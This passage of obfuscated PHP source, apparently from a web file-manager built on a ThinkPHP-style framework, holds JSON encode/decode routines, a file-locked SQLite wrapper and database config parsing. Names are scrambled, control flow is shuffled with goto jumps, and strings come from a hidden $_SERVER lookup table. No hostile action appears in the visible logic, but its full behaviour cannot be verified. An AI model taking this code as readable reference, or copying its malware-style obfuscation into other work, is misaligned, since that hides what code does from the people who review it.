== 8: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[1916]; break; case $B«Åé™‚Óƒ == 9: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[1552]; break; case $B«Åé™‚Óƒ == 10: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[1550]; break; case $B«Åé™‚Óƒ == 12: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[1917]; break; case $B«Åé™‚Óƒ == 13: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[1551]; break; case $B«Åé™‚Óƒ == 34: case $B«Åé™‚Óƒ == 47: case $B«Åé™‚Óƒ == 92: $d–¹Î‹×…– .= $dæÄÅ¨œ—Ÿ[93] . $b½Ò³–¡[$DªÈ¬¨äÜ¡]; break; case $B«Åé™‚Óƒ >= 32 && $B«Åé™‚Óƒ <= 127: $d–¹Î‹×…– .= $b½Ò³–¡[$DªÈ¬¨äÜ¡]; break; case ($B«Åé™‚Óƒ & 224) == 192: $CÛŒ˜Ø†Ó = pack($dæÄÅ¨œ—Ÿ[1918], $B«Åé™‚Óƒ, ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 1])); $DªÈ¬¨äÜ¡ += 1; $FÔ¨Æ­õ¦× = $this->utf82utf16($CÛŒ˜Ø†Ó); $d–¹Î‹×…– .= sprintf($dæÄÅ¨œ—Ÿ[1919], bin2hex($FÔ¨Æ­õ¦×)); break; case ($B«Åé™‚Óƒ & 240) == 224: $CÛŒ˜Ø†Ó = pack($dæÄÅ¨œ—Ÿ[1918], $B«Åé™‚Óƒ, ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 1]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 2])); $DªÈ¬¨äÜ¡ += 2; $FÔ¨Æ­õ¦× = $this->utf82utf16($CÛŒ˜Ø†Ó); $d–¹Î‹×…– .= sprintf($dæÄÅ¨œ—Ÿ[1919], bin2hex($FÔ¨Æ­õ¦×)); break; case ($B«Åé™‚Óƒ & 248) == 240: $CÛŒ˜Ø†Ó = pack($dæÄÅ¨œ—Ÿ[1918], $B«Åé™‚Óƒ, ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 1]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 2]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 3])); $DªÈ¬¨äÜ¡ += 3; $FÔ¨Æ­õ¦× = $this->utf82utf16($CÛŒ˜Ø†Ó); $d–¹Î‹×…– .= sprintf($dæÄÅ¨œ—Ÿ[1919], bin2hex($FÔ¨Æ­õ¦×)); break; case ($B«Åé™‚Óƒ & 252) == 248: $CÛŒ˜Ø†Ó = pack($dæÄÅ¨œ—Ÿ[1918], $B«Åé™‚Óƒ, ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 1]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 2]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 3]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 4])); $DªÈ¬¨äÜ¡ += 4; $FÔ¨Æ­õ¦× = $this->utf82utf16($CÛŒ˜Ø†Ó); $d–¹Î‹×…– .= sprintf($dæÄÅ¨œ—Ÿ[1919], bin2hex($FÔ¨Æ­õ¦×)); break; case ($B«Åé™‚Óƒ & 254) == 252: $CÛŒ˜Ø†Ó = pack($dæÄÅ¨œ—Ÿ[1918], $B«Åé™‚Óƒ, ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 1]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 2]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 3]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 4]), ord($b½Ò³–¡[$DªÈ¬¨äÜ¡ + 5])); $DªÈ¬¨äÜ¡ += 5; $FÔ¨Æ­õ¦× = $this->utf82utf16($CÛŒ˜Ø†Ó); $d–¹Î‹×…– .= sprintf($dæÄÅ¨œ—Ÿ[1919], bin2hex($FÔ¨Æ­õ¦×)); break; } } return $dæÄÅ¨œ—Ÿ[112] . $d–¹Î‹×…– . $dæÄÅ¨œ—Ÿ[112]; case $dæÄÅ¨œ—Ÿ[1920]: if (is_array($b½Ò³–¡) && count($b½Ò³–¡) && array_keys($b½Ò³–¡) !== range(0, sizeof($b½Ò³–¡) - 1)) { $b±Ø¢ÈË‹â = array_map(array($this, $dæÄÅ¨œ—Ÿ[1921]), array_keys($b½Ò³–¡), array_values($b½Ò³–¡)); foreach ($b±Ø¢ÈË‹â as $e‹Õ¼“¨’á) { if (Services_JSON::isError($e‹Õ¼“¨’á)) { return $e‹Õ¼“¨’á; } } return $dæÄÅ¨œ—Ÿ[1062] . join($dæÄÅ¨œ—Ÿ[47], $b±Ø¢ÈË‹â) . $dæÄÅ¨œ—Ÿ[311]; } $fö£ï£“òİ = array_map(array($this, $dæÄÅ¨œ—Ÿ[1922]), $b½Ò³–¡); foreach ($fö£ï£“òİ as $F¤…òÊˆÄ) { if (Services_JSON::isError($F¤…òÊˆÄ)) { return $F¤…òÊˆÄ; } } return $dæÄÅ¨œ—Ÿ[153] . join($dæÄÅ¨œ—Ÿ[47], $fö£ï£“òİ) . $dæÄÅ¨œ—Ÿ[472]; case $dæÄÅ¨œ—Ÿ[1923]: $a ŠÜ•±å = get_object_vars($b½Ò³–¡); $b±Ø¢ÈË‹â = array_map(array($this, $dæÄÅ¨œ—Ÿ[1921]), array_keys($a ŠÜ•±å), array_values($a ŠÜ•±å)); foreach ($b±Ø¢ÈË‹â as $e‹Õ¼“¨’á) { if (Services_JSON::isError($e‹Õ¼“¨’á)) { return $e‹Õ¼“¨’á; } } return $dæÄÅ¨œ—Ÿ[1062] . join($dæÄÅ¨œ—Ÿ[47], $b±Ø¢ÈË‹â) . $dæÄÅ¨œ—Ÿ[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dæÄÅ¨œ—Ÿ[99] : new Services_JSON_Error(gettype($b½Ò³–¡) . $dæÄÅ¨œ—Ÿ[1924]); } } function name_value($c¶İªØñ•, $AÊÈñ«óš) { $b„©Äëšîô = $this->encode($AÊÈñ«óš); if (Services_JSON::isError($b„©Äëšîô)) { return $b„©Äëšîô; } return $this->encode(strval($c¶İªØñ•)) . $_SERVER[Ö¹ñÒÁ²÷][4] . $b„©Äëšîô; } function reduce_string($b¯ÏÉŸÁ…) { $eš•»–ŠÖÓ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¯ÏÉŸÁ… = preg_replace(array($eš•»–ŠÖÓ[1925], $eš•»–ŠÖÓ[1926], $eš•»–ŠÖÓ[1927]), $eš•»–ŠÖÓ[33], $b¯ÏÉŸÁ…); return trim($b¯ÏÉŸÁ…); } function decode($FÛ±ËÙ«Ó) { $C÷–ÆŸ«· =& $_SERVER[Ö¹ñÒÁ²÷]; $FÛ±ËÙ«Ó = $this->reduce_string($FÛ±ËÙ«Ó); switch (strtolower($FÛ±ËÙ«Ó)) { case $C÷–ÆŸ«·[1575]: return !0; case $C÷–ÆŸ«·[1577]: return !1; case $C÷–ÆŸ«·[99]: return null; default: $B„ £ÚÃÍ = array(); if (is_numeric($FÛ±ËÙ«Ó)) { return (double) $FÛ±ËÙ«Ó == (int) $FÛ±ËÙ«Ó ? (int) $FÛ±ËÙ«Ó : (double) $FÛ±ËÙ«Ó; } elseif (preg_match($C÷–ÆŸ«·[1928], $FÛ±ËÙ«Ó, $B„ £ÚÃÍ) && $B„ £ÚÃÍ[1] == $B„ £ÚÃÍ[2]) { $eŒ…•ô£ë­ = substr($FÛ±ËÙ«Ó, 0, 1); $eò©Ì¼Ôç = substr($FÛ±ËÙ«Ó, 1, -1); $AæêŒ—ä½õ = $C÷–ÆŸ«·[33]; $b”‰ß–Ê— = strlen($eò©Ì¼Ôç); for ($f’Ù¡£¨éì = 0; $f’Ù¡£¨éì < $b”‰ß–Ê—; ++$f’Ù¡£¨éì) { $A–âÖÁ‡µÒ = substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 2); $fàäÇƒÒ‡ = ord($eò©Ì¼Ôç[$f’Ù¡£¨éì]); switch (!0) { case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1916]: $AæêŒ—ä½õ .= chr(8); ++$f’Ù¡£¨éì; break; case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1552]: $AæêŒ—ä½õ .= chr(9); ++$f’Ù¡£¨éì; break; case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1550]: $AæêŒ—ä½õ .= chr(10); ++$f’Ù¡£¨éì; break; case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1917]: $AæêŒ—ä½õ .= chr(12); ++$f’Ù¡£¨éì; break; case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1551]: $AæêŒ—ä½õ .= chr(13); ++$f’Ù¡£¨éì; break; case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1335]: case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1929]: case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1545]: case $A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1547]: if ($eŒ…•ô£ë­ == $C÷–ÆŸ«·[112] && $A–âÖÁ‡µÒ != $C÷–ÆŸ«·[1929] || $eŒ…•ô£ë­ == $C÷–ÆŸ«·[55] && $A–âÖÁ‡µÒ != $C÷–ÆŸ«·[1335]) { $AæêŒ—ä½õ .= $eò©Ì¼Ôç[++$f’Ù¡£¨éì]; } break; case preg_match($C÷–ÆŸ«·[1930], substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 6)): $a¤â†˜´¼™ = chr(hexdec(substr($eò©Ì¼Ôç, $f’Ù¡£¨éì + 2, 2))) . chr(hexdec(substr($eò©Ì¼Ôç, $f’Ù¡£¨éì + 4, 2))); $AæêŒ—ä½õ .= $this->utf162utf8($a¤â†˜´¼™); $f’Ù¡£¨éì += 5; break; case $fàäÇƒÒ‡ >= 32 && $fàäÇƒÒ‡ <= 127: $AæêŒ—ä½õ .= $eò©Ì¼Ôç[$f’Ù¡£¨éì]; break; case ($fàäÇƒÒ‡ & 224) == 192: $AæêŒ—ä½õ .= substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 2); ++$f’Ù¡£¨éì; break; case ($fàäÇƒÒ‡ & 240) == 224: $AæêŒ—ä½õ .= substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 3); $f’Ù¡£¨éì += 2; break; case ($fàäÇƒÒ‡ & 248) == 240: $AæêŒ—ä½õ .= substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 4); $f’Ù¡£¨éì += 3; break; case ($fàäÇƒÒ‡ & 252) == 248: $AæêŒ—ä½õ .= substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 5); $f’Ù¡£¨éì += 4; break; case ($fàäÇƒÒ‡ & 254) == 252: $AæêŒ—ä½õ .= substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 6); $f’Ù¡£¨éì += 5; break; } } return $AæêŒ—ä½õ; } elseif (preg_match($C÷–ÆŸ«·[1931], $FÛ±ËÙ«Ó) || preg_match($C÷–ÆŸ«·[1932], $FÛ±ËÙ«Ó)) { goto C¬“Ù´’; C¬“Ù´’: if ($FÛ±ËÙ«Ó[0] == $C÷–ÆŸ«·[153]) { $Có¾¹ÌåêÅ = array(SERVICES_JSON_IN_ARR); $bšÌ‘÷Å¦Ö = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Có¾¹ÌåêÅ = array(SERVICES_JSON_IN_OBJ); $DŸ¥“õÈ“Œ = array(); } else { $Có¾¹ÌåêÅ = array(SERVICES_JSON_IN_OBJ); $DŸ¥“õÈ“Œ = new stdClass(); } } array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_SLICE, $C÷–ÆŸ«·[259] => 0, $C÷–ÆŸ«·[1934] => !1)); $eò©Ì¼Ôç = substr($FÛ±ËÙ«Ó, 1, -1); goto BÈ¯ñ¾ò§»; D±­‰è£±ç: for ($f’Ù¡£¨éì = 0; $f’Ù¡£¨éì <= $b”‰ß–Ê—; ++$f’Ù¡£¨éì) { $a‰¤…ÁÌ‡– = end($Có¾¹ÌåêÅ); $A–âÖÁ‡µÒ = substr($eò©Ì¼Ôç, $f’Ù¡£¨éì, 2); if ($f’Ù¡£¨éì == $b”‰ß–Ê— || $eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[47] && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] == SERVICES_JSON_SLICE) { $DâÁ‹ì¤Õ = substr($eò©Ì¼Ôç, $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[259]], $f’Ù¡£¨éì - $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[259]]); array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_SLICE, $C÷–ÆŸ«·[259] => $f’Ù¡£¨éì + 1, $C÷–ÆŸ«·[1934] => !1)); if (reset($Có¾¹ÌåêÅ) == SERVICES_JSON_IN_ARR) { array_push($bšÌ‘÷Å¦Ö, $this->decode($DâÁ‹ì¤Õ)); } elseif (reset($Có¾¹ÌåêÅ) == SERVICES_JSON_IN_OBJ) { $D›Œö–Ö¡ = array(); if (preg_match($C÷–ÆŸ«·[1935], $DâÁ‹ì¤Õ, $D›Œö–Ö¡)) { $DÔêã¥Õ¬ = $this->decode($D›Œö–Ö¡[1]); $DÊŠŒù‰õ¢ = $this->decode($D›Œö–Ö¡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DŸ¥“õÈ“Œ[$DÔêã¥Õ¬] = $DÊŠŒù‰õ¢; } else { $DŸ¥“õÈ“Œ->{$DÔêã¥Õ¬} = $DÊŠŒù‰õ¢; } } elseif (preg_match($C÷–ÆŸ«·[1936], $DâÁ‹ì¤Õ, $D›Œö–Ö¡)) { $DÔêã¥Õ¬ = $D›Œö–Ö¡[1]; $DÊŠŒù‰õ¢ = $this->decode($D›Œö–Ö¡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DŸ¥“õÈ“Œ[$DÔêã¥Õ¬] = $DÊŠŒù‰õ¢; } else { $DŸ¥“õÈ“Œ->{$DÔêã¥Õ¬} = $DÊŠŒù‰õ¢; } } } } elseif (($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[112] || $eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[55]) && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] != SERVICES_JSON_IN_STR) { array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_IN_STR, $C÷–ÆŸ«·[259] => $f’Ù¡£¨éì, $C÷–ÆŸ«·[1934] => $eò©Ì¼Ôç[$f’Ù¡£¨éì])); } elseif ($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1934]] && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] == SERVICES_JSON_IN_STR && (strlen(substr($eò©Ì¼Ôç, 0, $f’Ù¡£¨éì)) - strlen(rtrim(substr($eò©Ì¼Ôç, 0, $f’Ù¡£¨éì), $C÷–ÆŸ«·[93]))) % 2 != 1) { array_pop($Có¾¹ÌåêÅ); } elseif ($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[153] && in_array($a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_IN_ARR, $C÷–ÆŸ«·[259] => $f’Ù¡£¨éì, $C÷–ÆŸ«·[1934] => !1)); } elseif ($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[472] && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] == SERVICES_JSON_IN_ARR) { array_pop($Có¾¹ÌåêÅ); } elseif ($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[1062] && in_array($a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_IN_OBJ, $C÷–ÆŸ«·[259] => $f’Ù¡£¨éì, $C÷–ÆŸ«·[1934] => !1)); } elseif ($eò©Ì¼Ôç[$f’Ù¡£¨éì] == $C÷–ÆŸ«·[311] && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] == SERVICES_JSON_IN_OBJ) { array_pop($Có¾¹ÌåêÅ); } elseif ($A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1937] && in_array($a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Có¾¹ÌåêÅ, array($C÷–ÆŸ«·[1933] => SERVICES_JSON_IN_CMT, $C÷–ÆŸ«·[259] => $f’Ù¡£¨éì, $C÷–ÆŸ«·[1934] => !1)); $f’Ù¡£¨éì++; } elseif ($A–âÖÁ‡µÒ == $C÷–ÆŸ«·[1938] && $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[1933]] == SERVICES_JSON_IN_CMT) { array_pop($Có¾¹ÌåêÅ); $f’Ù¡£¨éì++; for ($D¢šù‘Ü”­ = $a‰¤…ÁÌ‡–[$C÷–ÆŸ«·[259]]; $D¢šù‘Ü”­ <= $f’Ù¡£¨éì; ++$D¢šù‘Ü”­) { $eò©Ì¼Ôç = substr_replace($eò©Ì¼Ôç, $C÷–ÆŸ«·[50], $D¢šù‘Ü”­, 1); } } } if (reset($Có¾¹ÌåêÅ) == SERVICES_JSON_IN_ARR) { return $bšÌ‘÷Å¦Ö; } elseif (reset($Có¾¹ÌåêÅ) == SERVICES_JSON_IN_OBJ) { return $DŸ¥“õÈ“Œ; } goto FšÄ¦ˆŒÀô; BÈ¯ñ¾ò§»: $eò©Ì¼Ôç = $this->reduce_string($eò©Ì¼Ôç); if ($eò©Ì¼Ôç == $C÷–ÆŸ«·[33]) { if (reset($Có¾¹ÌåêÅ) == SERVICES_JSON_IN_ARR) { return $bšÌ‘÷Å¦Ö; } else { return $DŸ¥“õÈ“Œ; } } $b”‰ß–Ê— = strlen($eò©Ì¼Ôç); goto D±­‰è£±ç; FšÄ¦ˆŒÀô: } } } function isError($e¬ãÜ×•ŒŠ, $b¾½ÂéçŞœ = null) { $EÏğ¾„ÎÎ =& $_SERVER[Ö¹ñÒÁ²÷]; if (class_exists($EÏğ¾„ÎÎ[1939])) { return PEAR::isError($e¬ãÜ×•ŒŠ, $b¾½ÂéçŞœ); } elseif (is_object($e¬ãÜ×•ŒŠ) && (get_class($e¬ãÜ×•ŒŠ) == $EÏğ¾„ÎÎ[1940] || is_subclass_of($e¬ãÜ×•ŒŠ, $EÏğ¾„ÎÎ[1940]))) { return !0; } return !1; } } goto b·©ë˜»—É; DÏÑ‰”Å§˜: class DbSqlite3 extends DbSqlite3Base { public function query($Eğ‘Šï‡œ) { goto F¿³¹¬Ø²¤; F¿³¹¬Ø²¤: $DÙÁîÆ‚– =& $_SERVER[Ö¹ñÒÁ²÷]; $d®èŠĞä = DATA_PATH . $DÙÁîÆ‚–[868]; $B¥ÎŞ£¿™É = fopen($d®èŠĞä, $DÙÁîÆ‚–[869]); goto cÕ“ŸáˆÍ×; a¾òËÙ´¢ö: fclose($B¥ÎŞ£¿™É); show_json($DÙÁîÆ‚–[870], !1); return !1; goto føºŠÇ“‹š; cÕ“ŸáˆÍ×: if (!$B¥ÎŞ£¿™É) { return !1; } if (flock($B¥ÎŞ£¿™É, LOCK_EX)) { $D—Ü‚›Ò»ğ = parent::query($Eğ‘Šï‡œ); flock($B¥ÎŞ£¿™É, LOCK_UN); fclose($B¥ÎŞ£¿™É); return $D—Ü‚›Ò»ğ; } flock($B¥ÎŞ£¿™É, LOCK_UN); goto a¾òËÙ´¢ö; føºŠÇ“‹š: } public function execute($FÕšË—·î¼) { goto D‘—ôâ©‚˜; B¯¹×‚ŠÀ¦: if (!$dİƒõíÔ) { return !1; } if (flock($dİƒõíÔ, LOCK_EX)) { $c™›¹ìòß = parent::execute($FÕšË—·î¼); flock($dİƒõíÔ, LOCK_UN); fclose($dİƒõíÔ); return $c™›¹ìòß; } flock($dİƒõíÔ, LOCK_UN); goto C©ëƒÔŒàš; C©ëƒÔŒàš: fclose($dİƒõíÔ); show_json($F¾Ù¦É…èÑ[870], !1); return !1; goto FØ‘Ö Á; D‘—ôâ©‚˜: $F¾Ù¦É…èÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $F„×ˆğçé´ = DATA_PATH . $F¾Ù¦É…èÑ[868]; $dİƒõíÔ = fopen($F„×ˆğçé´, $F¾Ù¦É…èÑ[869]); goto B¯¹×‚ŠÀ¦; FØ‘Ö Á: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\147\164" => "\x3e", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\154\x74" => "\74\x3d", "\x6e\157\164\154\x69\x6b\145" => "\x4e\x4f\124\x20\114\x49\x4b\x45", "\154\x69\153\x65" => "\114\111\x4b\105", "\x69\156" => "\111\x4e", "\156\157\x74\151\x6e" => "\116\x4f\x54\40\x49\116", "\156\x6f\164\40\151\156" => "\x4e\x4f\x54\x20\111\x4e", "\142\x65\164\167\145\145\x6e" => "\x42\x45\124\x57\105\x45\x4e", "\x6e\x6f\164\x62\x65\164\x77\x65\x65\156" => "\x4e\x4f\x54\40\102\105\x54\127\105\x45\x4e", "\156\x6f\164\x20\142\145\x74\167\x65\x65\156" => "\x4e\117\124\40\x42\x45\x54\127\105\x45\x4e"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\45\x44\111\123\124\x49\x4e\103\124\45\40\45\x46\111\x45\114\104\x25\40\x46\122\117\115\40\45\x54\101\x42\x4c\105\45\45\112\117\x49\x4e\x25\45\x57\110\x45\x52\x45\45\x25\x47\122\x4f\x55\120\45\45\110\101\126\x49\116\107\x25\x25\x4f\x52\104\105\122\x25\45\x4c\111\115\x49\x54\x25\x20\x25\x55\x4e\x49\117\116\45\45\x43\117\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $Cá¿˜Ûó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ö¹ñÒÁ²÷][871], $Cá¿˜Ûó); } public function factory($bèÛ¼Ó¾˜¹ = '') { goto F¿Öç–¬¬; eÆí±Ü£÷¡: $this->dbType = ucwords(strtolower($bèÛ¼Ó¾˜¹[$aÛÑó’°·ö[872]])); $E„®ÉòäêŠ = $aÛÑó’°·ö[874] . $this->dbType; if (class_exists($E„®ÉòäêŠ)) { $b¶ö¦ñº  = new $E„®ÉòäêŠ($bèÛ¼Ó¾˜¹); if ($aÛÑó’°·ö[721] != strtolower($bèÛ¼Ó¾˜¹[$aÛÑó’°·ö[872]])) { $b¶ö¦ñº ->dbType = strtoupper($this->dbType); } else { $b¶ö¦ñº ->dbType = $this->_getDsnType($bèÛ¼Ó¾˜¹[$aÛÑó’°·ö[824]]); } } else { think_exception(think_lang($aÛÑó’°·ö[875]) . $aÛÑó’°·ö[876] . $E„®ÉòäêŠ); } goto dé¶øˆñÑƒ; F¿Öç–¬¬: $aÛÑó’°·ö =& $_SERVER[Ö¹ñÒÁ²÷]; $bèÛ¼Ó¾˜¹ = $this->parseConfig($bèÛ¼Ó¾˜¹); if (empty($bèÛ¼Ó¾˜¹[$aÛÑó’°·ö[872]])) { think_exception(think_lang($aÛÑó’°·ö[873])); } goto eÆí±Ü£÷¡; dé¶øˆñÑƒ: return $b¶ö¦ñº ; goto Fø“„ğÂƒô; Fø“„ğÂƒô: } public function __call($Eñƒ™–ˆÎÄ, $B˜‰›°š“) { if (method_exists($this, $Eñƒ™–ˆÎÄ)) { return call_user_func_array(array($this, $Eñƒ™–ˆÎÄ), $B˜‰›°š“); } } protected function _getDsnType($A¬¶ƒĞ”ñí) { $a«¤÷ÏÌíµ = explode($_SERVER[Ö¹ñÒÁ²÷][4], $A¬¶ƒĞ”ñí); $EäàŒ˜»› = strtoupper(trim($a«¤÷ÏÌíµ[0])); return $EäàŒ˜»›; } private function parseConfig($DòÂ°¼‰Í = '') { $DíÕˆ’»°¶ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($DòÂ°¼‰Í) && is_string($DòÂ°¼‰Í)) { $DòÂ°¼‰Í = $this->parseDSN($DòÂ°¼‰Í); } elseif (is_array($DòÂ°¼‰Í)) { $DòÂ°¼‰Í = array_change_key_case($DòÂ°¼‰Í); $DòÂ°¼‰Í = array($DíÕˆ’»°¶[872] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[720]], $DíÕˆ’»°¶[797] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[877]], $DíÕˆ’»°¶[798] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[878]], $DíÕˆ’»°¶[795] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[879]], $DíÕˆ’»°¶[796] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[880]], $DíÕˆ’»°¶[17] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[881]], $DíÕˆ’»°¶[824] => $DòÂ°¼‰Í[$DíÕˆ’»°¶[722]], $DíÕˆ’»°¶[13] => isset($DòÂ°¼‰Í[$DíÕˆ’»°¶[882]]) ? $DòÂ°¼‰Í[$DíÕˆ’»°¶[882]] : array()); } elseif (empty($DòÂ°¼‰Í)) { if (think_config($DíÕˆ’»°¶[883]) && $DíÕˆ’»°¶[721] != strtolower(think_config($DíÕˆ’»°¶[884]))) { $DòÂ°¼‰Í = $this->parseDSN(think_config($DíÕˆ’»°¶[883])); } else { $DòÂ°¼‰Í = array($DíÕˆ’»°¶[872] => think_config($DíÕˆ’»°¶[884]), $DíÕˆ’»°¶[797] => think_config($DíÕˆ’»°¶[885]), $DíÕˆ’»°¶[798] => think_config($DíÕˆ’»°¶[886]), $DíÕˆ’»°¶[795] => think_config($DíÕˆ’»°¶[887]), $DíÕˆ’»°¶[796] => think_config($DíÕˆ’»°¶[888]), $DíÕˆ’»°¶[17] => think_config($DíÕˆ’»°¶[230]), $DíÕˆ’»°¶[824] => think_config($DíÕˆ’»°¶[883]), $DíÕˆ’»°¶[13] => think_config($DíÕˆ’»°¶[889])); } } return $DòÂ°¼‰Í; } protected function initConnect($c¼Ò…‹ÕáÙ = true) { if (1 == think_config($_SERVER[Ö¹ñÒÁ²÷][18])) { $this->_linkID = $this->multiConnect($c¼Ò…‹ÕáÙ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($AÈÈÑßÎù” = false) { $Bïõ»»™öÀ =& $_SERVER[Ö¹ñÒÁ²÷]; static $C•Îƒ±’“° = array(); if (empty($C•Îƒ±’“°)) { foreach ($this->config as $c³Ù•¼Ë¸¡ => $aÛ‡ŠÒÄìµ) { $C•Îƒ±’“°[$c³Ù•¼Ë¸¡] = explode($Bïõ»»™öÀ[47], $aÛ‡ŠÒÄìµ); } } if (think_config($Bïõ»»™öÀ[890])) { if ($AÈÈÑßÎù”) { $B¾æÉçå‰– = floor(mt_rand(0, think_config($Bïõ»»™öÀ[891]) - 1)); } else { if (is_numeric(think_config($Bïõ»»™öÀ[892]))) { $B¾æÉçå‰– = think_config($Bïõ»»™öÀ[892]); } else { $B¾æÉçå‰– = floor(mt_rand(think_config($Bïõ»»™öÀ[891]), count($C•Îƒ±’“°[$Bïõ»»™öÀ[795]]) - 1)); } } } else { $B¾æÉçå‰– = floor(mt_rand(0, count($C•Îƒ±’“°[$Bïõ»»™öÀ[795]]) - 1)); } $DÇó‘— É† = array($Bïõ»»™öÀ[797] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[797]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[797]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[797]][0], $Bïõ»»™öÀ[798] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[798]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[798]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[798]][0], $Bïõ»»™öÀ[795] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[795]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[795]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[795]][0], $Bïõ»»™öÀ[796] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[796]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[796]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[796]][0], $Bïõ»»™öÀ[17] => 